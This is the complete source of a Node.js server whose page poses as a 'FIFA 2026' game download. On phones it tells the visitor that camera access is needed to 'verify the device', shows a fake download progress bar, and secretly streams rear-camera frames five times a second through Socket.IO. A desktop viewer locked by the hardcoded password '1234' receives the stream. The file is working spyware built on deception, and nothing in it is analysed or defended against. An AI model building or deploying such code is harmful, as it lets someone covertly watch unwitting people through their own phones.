const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;
const SENHA = "1234"; // 🔑 Mude para a senha que quiser

// ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
function detectarDispositivo(userAgent) {
  const ua = userAgent.toLowerCase();
  const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
  const isTablet = /ipad|tablet|kindle|silk|playbook/i.test(ua);
  
  if (isTablet) return 'tablet';
  if (isMobile) return 'mobile';
  return 'desktop';
}

app.get('/', (req, res) => {
  // Detecta o dispositivo do usuário
  const dispositivo = detectarDispositivo(req.headers['user-agent'] || '');
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>📱 Game Download</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        
        /* Estilos gerais */
        h1 { color: #333; margin-bottom: 30px; }
        
        /* Botão de permissão */
        .permission-button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            margin: 20px 0;
            font-weight: bold;
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
            transition: all 0.3s;
            width: 100%;
            max-width: 300px;
        }
        
        .permission-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 30px rgba(0,0,0,0.3);
        }
        
        .permission-button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .permission-info {
            background: #e8f5e9;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #2e7d32;
            border-left: 5px solid #4CAF50;
        }
        
        /* Estilos para CELULAR */
        .mobile-container {
            animation: fadeIn 1s;
        }
        
        .game-logo {
            font-size: 80px;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .game-title {
            font-size: 28px;
            color: #333;
            margin-bottom: 10px;
            font-weight: bold;
        }
        
        .game-subtitle {
            color: #666;
            margin-bottom: 30px;
        }
        
        /* Barrinha de progresso */
        .progress-container {
            background: #f0f0f0;
            border-radius: 25px;
            height: 30px;
            width: 100%;
            margin: 30px 0;
            overflow: hidden;
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.2);
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #4CAF50, #8BC34A);
            border-radius: 25px;
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
        }
        
        .progress-text {
            font-size: 18px;
            margin-top: 10px;
            color: #4CAF50;
            font-weight: bold;
        }
        
        .download-speed {
            background: #e3f2fd;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: monospace;
            font-size: 14px;
            color: #1976D2;
        }
        
        /* Estilos para PC */
        .pc-container {
            text-align: left;
        }
        
        .video-container {
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .camera-wrapper {
            position: relative;
            width: 100%;
            background: #000;
            border-radius: 10px;
            overflow: hidden;
            aspect-ratio: 4/3;
        }
        
        #remoteVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        
        #passwordOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            border-radius: 10px;
        }
        
        .password-box {
            background: white;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            width: 90%;
            max-width: 300px;
        }
        
        .password-box h3 { color: #333; margin-bottom: 20px; }
        .password-box input {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            border: 2px solid #ddd;
            border-radius: 8px;
            margin-bottom: 15px;
            text-align: center;
        }
        .password-box button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
        }
        
        .info-box {
            background: #e3f2fd;
            padding: 20px;
            border-radius: 10px;
            border-left: 5px solid #2196F3;
        }
        
        .hidden {
            display: none;
        }
        
        #localVideo {
            display: none;
        }
        
        /* Área de permissão */
        .permission-area {
            background: #f5f5f5;
            padding: 30px;
            border-radius: 15px;
            margin: 20px 0;
        }
        
        .camera-icon {
            font-size: 50px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- CONTEÚDO PARA CELULAR -->
        <div id="mobileContent" class="mobile-container hidden">
            <div class="game-logo">🎮</div>
            <div class="game-title">FIFA 2026</div>
            <div class="game-subtitle">Ultimate Edition</div>
            
            <div class="progress-container">
                <div id="progressBar" class="progress-bar" style="width: 0%">0%</div>
            </div>
            
            <div id="progressPercent" class="progress-text">0% concluído</div>
            
            <div class="download-speed" id="speedInfo">
                ⬇️ 0 MB / 0 MB • 0 MB/s
            </div>
            
            <div class="status-message" id="statusMessage">
                ⏳ Aguardando permissão da câmera...
            </div>
            
            <!-- ÁREA DO BOTÃO DE PERMISSÃO -->
            <div id="permissionArea" class="permission-area">
                <div class="camera-icon">📷</div>
                <h3>Precisamos da sua câmera</h3>
                <p style="margin-bottom: 20px; color: #666;">Para continuar o download, precisamos verificar seu dispositivo. Clique no botão abaixo para permitir.</p>
                <button id="permitirCameraBtn" class="permission-button" onclick="solicitarPermissaoCamera()">
                    📷 Permitir Acesso à Câmera
                </button>
                <div class="permission-info" id="permissionInfo" style="display: none;">
                    ✅ Permissão concedida! Iniciando download...
                </div>
            </div>
        </div>
        
        <!-- CONTEÚDO PARA PC -->
        <div id="pcContent" class="pc-container hidden">
            <h1 style="text-align: center; margin-bottom: 30px;">📷 Visualização Remota</h1>
            
            <div class="video-container">
                <div class="camera-wrapper">
                    <img id="remoteVideo">
                    
                    <div id="passwordOverlay">
                        <div class="password-box">
                            <h3>🔒 Conteúdo Bloqueado</h3>
                            <p style="margin-bottom: 15px;">Digite a senha para liberar</p>
                            <input type="password" id="senhaInput" maxlength="4" placeholder="****">
                            <button onclick="verificarSenha()">Liberar Visualização</button>
                            <div id="erroSenha" style="color: #f44336; margin-top: 10px; display: none;">Senha incorreta!</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="info-box">
                <h4>📱 Informações:</h4>
                <p>Digite a senha <strong>"1234"</strong> para ver a transmissão ao vivo do celular.</p>
                <p>No celular, um botão vai pedir permissão para a câmera.</p>
            </div>
        </div>
        
        <!-- Vídeo escondido para captura (celular) -->
        <video id="localVideo" autoplay playsinline muted style="display: none;"></video>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const SENHA_CORRETA = "1234";
        
        // Elementos
        const mobileContent = document.getElementById('mobileContent');
        const pcContent = document.getElementById('pcContent');
        const localVideo = document.getElementById('localVideo');
        const remoteVideo = document.getElementById('remoteVideo');
        const passwordOverlay = document.getElementById('passwordOverlay');
        const permitirCameraBtn = document.getElementById('permitirCameraBtn');
        const permissionInfo = document.getElementById('permissionInfo');
        const permissionArea = document.getElementById('permissionArea');
        
        // Elementos da barrinha
        const progressBar = document.getElementById('progressBar');
        const progressPercent = document.getElementById('progressPercent');
        const speedInfo = document.getElementById('speedInfo');
        const statusMessage = document.getElementById('statusMessage');
        
        // Estado
        let mediaStream = null;
        let visualizacaoLiberada = false;
        let progresso = 0;
        let intervaloProgresso = null;
        let cameraPronta = false;
        
        // ========== DETECÇÃO DE DISPOSITIVO ==========
        function detectarDispositivo() {
            const ua = navigator.userAgent.toLowerCase();
            return /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
        }
        
        const isMobile = detectarDispositivo();
        
        // ========== CONFIGURAÇÃO POR DISPOSITIVO ==========
        if (isMobile) {
            // 📱 É CELULAR - Mostra a tela com botão de permissão
            console.log('📱 Celular detectado - aguardando permissão');
            mobileContent.classList.remove('hidden');
            pcContent.classList.add('hidden');
            
            statusMessage.innerHTML = '⏳ Clique no botão para permitir a câmera';
            
        } else {
            // 💻 É PC - Mostra o visualizador
            console.log('💻 PC detectado - modo visualizador');
            mobileContent.classList.add('hidden');
            pcContent.classList.remove('hidden');
        }
        
        // ========== FUNÇÃO PARA SOLICITAR PERMISSÃO (BOTÃO) ==========
        window.solicitarPermissaoCamera = async function() {
            try {
                console.log('📷 Solicitando permissão da câmera...');
                
                // Desabilita o botão enquanto processa
                permitirCameraBtn.disabled = true;
                permitirCameraBtn.innerHTML = '⏳ Solicitando permissão...';
                statusMessage.innerHTML = '📷 Solicitando acesso à câmera...';
                
                // Solicita acesso à câmera
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: 640, 
                        height: 480,
                        facingMode: 'environment'
                    },
                    audio: false
                });
                
                // Sucesso!
                mediaStream = stream;
                localVideo.srcObject = stream;
                await localVideo.play();
                
                // Mostra mensagem de sucesso
                permissionInfo.style.display = 'block';
                permitirCameraBtn.style.display = 'none';
                statusMessage.innerHTML = '✅ Permissão concedida! Iniciando download...';
                
                // Inicia o download falso e a transmissão
                cameraPronta = true;
                iniciarDownloadFalso();
                iniciarTransmissao();
                
                console.log('✅ Câmera autorizada com sucesso!');
                
            } catch (err) {
                console.error('Erro ao solicitar permissão:', err);
                
                // Reabilita o botão em caso de erro
                permitirCameraBtn.disabled = false;
                permitirCameraBtn.innerHTML = '📷 Tentar Novamente';
                
                // Mensagem de erro específica
                if (err.name === 'NotAllowedError') {
                    statusMessage.innerHTML = '❌ Permissão negada. Clique no cadeado 🔒 da URL e permita a câmera.';
                } else if (err.name === 'NotFoundError') {
                    statusMessage.innerHTML = '❌ Nenhuma câmera encontrada neste dispositivo.';
                } else {
                    statusMessage.innerHTML = '❌ Erro: ' + err.message;
                }
            }
        };
        
        // ========== FUNÇÃO PARA INICIAR TRANSMISSÃO ==========
        function iniciarTransmissao() {
            if (!cameraPronta) return;
            
            const canvas = document.createElement('canvas');
            canvas.width = 640;
            canvas.height = 480;
            const ctx = canvas.getContext('2d');
            
            // Função de captura
            setInterval(() => {
                try {
                    ctx.drawImage(localVideo, 0, 0, 640, 480);
                    const frame = canvas.toDataURL('image/jpeg', 0.5);
                    socket.emit('frame', frame);
                } catch (e) {
                    console.log('Erro na captura:', e);
                }
            }, 200);
            
            console.log('✅ Transmissão iniciada!');
        }
        
        // ========== FUNÇÃO DA BARRINHA FALSA ==========
        function iniciarDownloadFalso() {
            progresso = 0;
            const tamanhoTotal = 2500;
            const velocidades = ['1.2 MB/s', '1.5 MB/s', '1.8 MB/s', '2.1 MB/s', '1.9 MB/s', '2.3 MB/s'];
            let velocidadeIndex = 0;
            
            setTimeout(() => {
                statusMessage.innerHTML = '📦 Baixando arquivos do jogo...';
                
                intervaloProgresso = setInterval(() => {
                    if (progresso < 100) {
                        const incremento = Math.random() * 3 + 2;
                        progresso = Math.min(100, progresso + incremento);
                        
                        progressBar.style.width = progresso + '%';
                        progressBar.innerHTML = progresso.toFixed(0) + '%';
                        progressPercent.innerHTML = progresso.toFixed(0) + '% concluído';
                        
                        const baixado = ((progresso / 100) * tamanhoTotal).toFixed(1);
                        velocidadeIndex = (velocidadeIndex + 1) % velocidades.length;
                        speedInfo.innerHTML = \`⬇️ \${baixado} MB / \${tamanhoTotal} MB • \${velocidades[velocidadeIndex]}\`;
                        
                        if (progresso > 95) {
                            statusMessage.innerHTML = '📦 Quase lá... verificando arquivos';
                        } else if (progresso > 75) {
                            statusMessage.innerHTML = '🎮 Finalizando download...';
                        } else if (progresso > 50) {
                            statusMessage.innerHTML = '⚡ Instalando recursos do jogo...';
                        } else if (progresso > 25) {
                            statusMessage.innerHTML = '🎵 Baixando áudios e texturas...';
                        }
                        
                        if (progresso >= 100) {
                            clearInterval(intervaloProgresso);
                            progressBar.style.background = 'linear-gradient(90deg, #4CAF50, #2196F3)';
                            statusMessage.innerHTML = '✅ Download concluído! Instalação em segundo plano...';
                            speedInfo.innerHTML = '⬇️ 2500 MB / 2500 MB • 0 MB/s';
                        }
                    }
                }, 400);
            }, 1000);
        }
        
        // ========== VERIFICAÇÃO DE SENHA (PC) ==========
        window.verificarSenha = function() {
            const senha = document.getElementById('senhaInput').value;
            if (senha === SENHA_CORRETA) {
                passwordOverlay.style.display = 'none';
                visualizacaoLiberada = true;
            } else {
                document.getElementById('erroSenha').style.display = 'block';
            }
        };
        
        document.getElementById('senhaInput')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verificarSenha();
        });
        
        // ========== SOCKET.IO ==========
        socket.on('connect', () => {
            console.log('Conectado ao servidor');
        });
        
        socket.on('frame', (frameData) => {
            if (visualizacaoLiberada) {
                remoteVideo.src = frameData;
            }
        });
    </script>
</body>
</html>
  `);
});

// Socket.IO
io.on('connection', (socket) => {
  console.log('Cliente conectado');
  
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
});

server.listen(PORT, () => {
  console.log('='.repeat(60));
  console.log('📱 SISTEMA COM BOTÃO DE PERMISSÃO');
  console.log('='.repeat(60));
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`🔑 Senha: ${SENHA}`);
  console.log('📱 No celular: botão para permitir câmera');
  console.log('💻 No PC: visualizador normal');
  console.log('='.repeat(60));
});
